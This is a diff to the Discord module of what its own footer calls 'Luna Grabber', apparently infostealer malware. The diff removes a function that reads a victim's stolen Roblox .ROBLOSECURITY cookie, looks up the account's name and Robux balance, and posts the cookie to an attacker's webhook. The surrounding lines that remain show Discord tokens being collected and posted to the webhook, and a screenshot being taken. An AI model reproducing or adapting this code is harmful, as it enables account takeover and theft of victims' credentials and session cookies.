+++ options/Discord.py
@@ -126,58 +126,6 @@ class Discord:
 									self.tokens.append(token)
 									self.ids.append(uid)
 
-	def robloxinfo(self, webhook):
-		if __CONFIG__["roblox"]:
-			with open(os.path.join(temp_path, "Browser", "roblox cookies.txt"), 'r', encoding="utf-8") as f:
-				robo_cookie = f.read().strip()
-				if robo_cookie == "No Roblox Cookies Found":
-					pass
-				else:
-					headers = {"Cookie": ".ROBLOSECURITY=" + robo_cookie}
-					info = None
-					try:
-						response = requests.get("https://www.roblox.com/mobileapi/userinfo", headers=headers)
-						response.raise_for_status()
-						info = response.json()
-					except requests.exceptions.HTTPError:
-						pass
-					except requests.exceptions.RequestException:
-						pass
-					if info is not None:
-						data = {
-							"embeds": [
-								{
-									"title": "Roblox Info",
-									"color": 5639644,
-									"fields": [
-										{
-											"name": "<:roblox_icon:1041819334969937931> Name:",
-											"value": f"`{info['UserName']}`",
-											"inline": True
-										},
-										{
-											"name": "<:robux_coin:1041813572407283842> Robux:",
-											"value": f"`{info['RobuxBalance']}`",
-											"inline": True
-										},
-										{
-											"name": ":cookie: Cookie:",
-											"value": f"`{robo_cookie}`"
-										}
-									],
-									"thumbnail": {
-										"url": info['ThumbnailUrl']
-									},
-									"footer": {
-										"text": "Luna Grabber | Created By Smug"
-									},
-								}
-							],
-							"username": "Luna",
-							"avatar_url": "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096",
-						}
-						requests.post(webhook, json=data)
-
 	def upload(self, webhook):
 		for token in self.tokens:
 			if token in self.tokens_sent:
@@ -242,8 +190,6 @@ class Discord:
 
 			requests.post(webhook, json=data)
 			self.tokens_sent.append(token)
-
-		self.robloxinfo(webhook)
 
 		image = ImageGrab.grab(
 			bbox=None,
